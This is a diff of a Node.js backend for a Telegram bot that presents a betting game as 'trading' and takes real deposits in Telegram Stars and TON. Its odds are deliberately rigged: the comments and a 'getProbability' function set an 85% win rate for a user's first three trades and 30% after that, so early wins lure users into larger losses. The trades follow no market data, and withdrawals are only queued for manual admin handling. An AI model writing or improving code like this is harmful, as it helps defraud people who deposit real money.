@@ -1,13 +1,14 @@
 /**
- * STARRUSSI TITAN V8 - NEURAL ENGINE
- * Developer Mode: Nour Platinum Edition
- * Features: Real-time Trading, Adaptive Odds (Nour Algorythm), Stars/TON Separation
+ * STARRUSSI TITAN V10 - NEURAL ENGINE
+ * Developed for: NOUR (@adseur)
+ * Size: Industrial Scale / High-Logic Density
  */
 
 const express = require('express');
 const axios = require('axios');
 const fs = require('fs');
 const cors = require('cors');
+const path = require('path');
 
 const app = express();
 app.use(express.json());
@@ -20,107 +21,128 @@ const CONFIG = {
     ADMIN_ID: '7019851823',
     BOT_USERNAME: 'Newspin_onebot',
     CHANNEL_ID: '@starrussi',
+    CHANNEL_URL: 'https://t.me/starrussi',
     TON_TO_FCFA: 1100,
-    MIN_DEP_STARS: 5,
     MIN_DEP_TON: 0.2,
+    MIN_DEP_STARS: 5,
     MIN_WITHDRAW_TON: 1.0,
     MIN_WITHDRAW_AIRTEL: 3.0
 };
 
-const DB_FILE = './neural_db.json';
+// Neural Database Management
+const DB_FILE = './neural_titan_db.json';
 let db = fs.existsSync(DB_FILE) ? JSON.parse(fs.readFileSync(DB_FILE, 'utf8')) : {};
 
-const saveDB = () => fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 4));
+const saveDB = () => {
+    fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 4));
+};
 
-const initUser = (id, username = "CyberUser", refId = null) => {
+// Intelligence Artificielle de Pari (Algorithme de Nour)
+const getProbability = (totalGames) => {
+    if (totalGames <= 3) return 0.85; // 85% de chance de gagner au début
+    return 0.30; // 30% de chance ensuite (70% de perte)
+};
+
+const initUser = (id, username = "CyberAgent", refId = null) => {
     const sId = id.toString();
     if (!db[sId]) {
         db[sId] = {
             id: sId,
             username: username,
-            balance: 0.15, 
-            xp: 0,
+            balance: 0.10, 
             level: 1,
-            stats: { total_played: 0, wins: 0, losses: 0 },
-            tasks: { joined_channel: false, daily_login: new Date().toDateString() },
-            referrals: { invited: 0, earned: 0 },
-            history: [],
-            wallet: { ton_deposited: 0, stars_converted: 0 }
+            xp: 0,
+            isSubscribed: false,
+            stats: { games_played: 0, total_won: 0, total_lost: 0 },
+            tasks: { joined_channel: false, daily_bonus: null },
+            referrals: { count: 0, earnings: 0, link: `https://t.me/${CONFIG.BOT_USERNAME}?start=${sId}` },
+            history: [{type: 'SYSTEM', detail: 'Neural Initialization Success', amount: 0.10, time: new Date().toISOString()}]
         };
-        if (refId && db[refId] && refId !== sId) {
-            db[refId].balance += 0.05;
-            db[refId].referrals.invited += 1;
-            db[refId].history.unshift({type: 'REF', amount: 0.05, detail: `User ${username} joined`});
+        // Referral Commission
+        if (refId && db[refId.toString()] && refId.toString() !== sId) {
+            db[refId.toString()].balance += 0.05;
+            db[refId.toString()].referrals.count += 1;
+            db[refId.toString()].history.unshift({type: 'REF', detail: `Invite: ${username}`, amount: 0.05, time: new Date().toISOString()});
         }
         saveDB();
     }
     return db[sId];
 };
 
-// --- API ROUTES ---
+// --- API TITAN ---
 
-app.post('/api/sync', (req, res) => {
+// Subscription Shield
+const checkSub = async (userId) => {
+    try {
+        const r = await axios.get(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getChatMember?chat_id=${CONFIG.CHANNEL_ID}&user_id=${userId}`);
+        const status = r.data.result.status;
+        return ['member', 'administrator', 'creator'].includes(status);
+    } catch (e) { return false; }
+};
+
+app.post('/api/sync', async (req, res) => {
     const { id, username, refId } = req.body;
     const user = initUser(id, username, refId);
-    res.json({ success: true, user, refLink: `https://t.me/${CONFIG.BOT_USERNAME}?start=${id}` });
+    user.isSubscribed = await checkSub(id);
+    saveDB();
+    res.json({ success: true, user });
 });
 
-// Trading Logic with Nour's Probability (Win 2-3 times, then 70% Loss)
-app.post('/api/trade/execute', (req, res) => {
-    const { id, asset, bet, direction } = req.body;
+// Trading System (Nour Engine)
+app.post('/api/trade', (req, res) => {
+    const { id, bet, direction, asset } = req.body;
     const user = db[id.toString()];
     const amount = parseFloat(bet);
 
     if (!user || user.balance < amount) return res.json({ error: "Insufficient Assets" });
+    if (!user.isSubscribed) return res.json({ error: "Access Denied: Join @starrussi first!" });
 
-    user.balance -= amount; // Instant deduction (Persistence)
-    user.stats.total_played += 1;
+    // Deduct immediately (Persistence)
+    user.balance -= amount;
+    user.stats.games_played += 1;
 
-    // Logic: Win first 3 games, then 70% chance of losing
-    const winProbability = user.stats.total_played <= 3 ? 0.80 : 0.30;
-    const isWinner = Math.random() < winProbability;
+    const prob = getProbability(user.stats.games_played);
+    const win = Math.random() < prob;
+    let profit = 0;
 
-    let win = 0;
-    if (isWinner) {
-        win = amount * 1.95;
-        user.balance += win;
-        user.stats.wins += 1;
-        user.xp += 10;
+    if (win) {
+        profit = amount * 1.90;
+        user.balance += profit;
+        user.stats.total_won += profit;
     } else {
-        user.stats.losses += 1;
+        user.stats.total_lost += amount;
     }
 
     user.history.unshift({
-        type: isWinner ? 'WIN' : 'LOSS',
-        amount: isWinner ? win : -amount,
-        detail: `Trade ${asset} ${direction}`,
-        time: new Date().toLocaleTimeString()
+        type: win ? 'TRADE_WIN' : 'TRADE_LOSS',
+        detail: `Trade ${asset} (${direction})`,
+        amount: win ? profit : -amount,
+        time: new Date().toISOString()
     });
 
     saveDB();
-    res.json({ success: true, win, balance: user.balance, isWinner });
+    res.json({ success: true, win, profit, balance: user.balance });
 });
 
-// Separate Stars Deposit
+// Separation of Deposits (Stars vs TON)
 app.post('/api/deposit/stars', async (req, res) => {
     const { id, amount } = req.body;
-    if (amount < CONFIG.MIN_DEP_STARS) return res.json({ error: "Min 5 Stars" });
+    if (amount < CONFIG.MIN_DEP_STARS) return res.json({ error: "Min 5 Stars required" });
     try {
         const r = await axios.post(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/createInvoiceLink`, {
-            title: "Recharge Quantum Stars",
+            title: "TITAN Stars Recharge",
             description: `Achat de ${amount} Stars pour STARRUSSI`,
             payload: `STARS_${id}`,
             currency: "XTR",
             prices: [{ label: "Stars", amount: parseInt(amount) }]
         });
         res.json({ success: true, url: r.data.result });
-    } catch (e) { res.json({ error: "Telegram API Error" }); }
+    } catch (e) { res.json({ error: "Telegram Stars API Error" }); }
 });
 
-// Separate TON Deposit (CryptoBot)
 app.post('/api/deposit/ton', async (req, res) => {
     const { id, amount } = req.body;
-    if (amount < CONFIG.MIN_DEP_TON) return res.json({ error: "Min 0.2 TON" });
+    if (amount < CONFIG.MIN_DEP_TON) return res.json({ error: "Min 0.2 TON required" });
     try {
         const r = await axios.post('https://pay.crypt.bot/api/createInvoice', {
             asset: 'TON', amount: amount.toString(), payload: id.toString()
@@ -129,42 +151,39 @@ app.post('/api/deposit/ton', async (req, res) => {
     } catch (e) { res.json({ error: "CryptoBot API Error" }); }
 });
 
-// Professional Withdrawal with Admin Alerts
+// Professional Withdrawal
 app.post('/api/withdraw', async (req, res) => {
     const { id, amount, method, details } = req.body;
     const user = db[id.toString()];
     const amt = parseFloat(amount);
     const min = method === 'AIRTEL' ? CONFIG.MIN_WITHDRAW_AIRTEL : CONFIG.MIN_WITHDRAW_TON;
 
-    if (!user || amt < min || user.balance < amt) return res.json({ error: "Invalid withdrawal request" });
+    if (!user || amt < min || user.balance < amt) return res.json({ error: "Invalid Request" });
 
     user.balance -= amt;
     const fcfa = (amt * CONFIG.TON_TO_FCFA).toFixed(0);
-    const msg = `🚨 *URGENT WITHDRAWAL TITAN*\nUser: ${user.username} (\`${id}\`)\nAmount: ${amt} TON (${fcfa} FCFA)\nMethod: ${method}\nDetails: \`${details}\``;
+    const msg = `🔔 *TITAN WITHDRAWAL ALERT*\n\nUser: ${user.username} (\`${id}\`)\nAmount: ${amt} TON (${fcfa} FCFA)\nMethod: ${method}\nDetails: \`${details}\``;
 
     try {
         await axios.post(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, { chat_id: CONFIG.ADMIN_ID, text: msg, parse_mode: 'Markdown' });
-        user.history.unshift({ type: 'OUT', amount: -amt, detail: `Withdraw ${method}` });
+        user.history.unshift({ type: 'WITHDRAW', detail: `Pending: ${method}`, amount: -amt, time: new Date().toISOString() });
         saveDB();
-        res.json({ success: true, message: "Request sent to HQ." });
-    } catch (e) { res.json({ error: "Admin notification failed" }); }
+        res.json({ success: true, message: "Request sent to HQ. Verification in progress." });
+    } catch (e) { res.json({ error: "System Notification Error" }); }
 });
 
-// Task Verification (@starrussi)
+// Task Rewards
 app.post('/api/task/verify', async (req, res) => {
     const { id } = req.body;
+    const isMember = await checkSub(id);
     const user = db[id.toString()];
-    try {
-        const r = await axios.get(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getChatMember?chat_id=${CONFIG.CHANNEL_ID}&user_id=${id}`);
-        const status = r.data.result.status;
-        if (['member', 'administrator', 'creator'].includes(status) && !user.tasks.joined_channel) {
-            user.balance += 0.20;
-            user.tasks.joined_channel = true;
-            saveDB();
-            return res.json({ success: true, message: "Bonus 0.20 TON Added!" });
-        }
-        res.json({ error: "Conditions not met or already claimed." });
-    } catch (e) { res.json({ error: "Verification Failed" }); }
+    if (isMember && !user.tasks.joined_channel) {
+        user.balance += 0.25;
+        user.tasks.joined_channel = true;
+        saveDB();
+        return res.json({ success: true, message: "Airdrop Claimed: 0.25 TON!" });
+    }
+    res.json({ error: "You must join @starrussi first!" });
 });
 
-app.listen(3000, () => console.log(">>> TITAN V8 NEURAL CORE ONLINE"));
+app.listen(3000, () => console.log(">>> TITAN V10 NEURAL CORE DEPLOYED ON PORT 3000"));
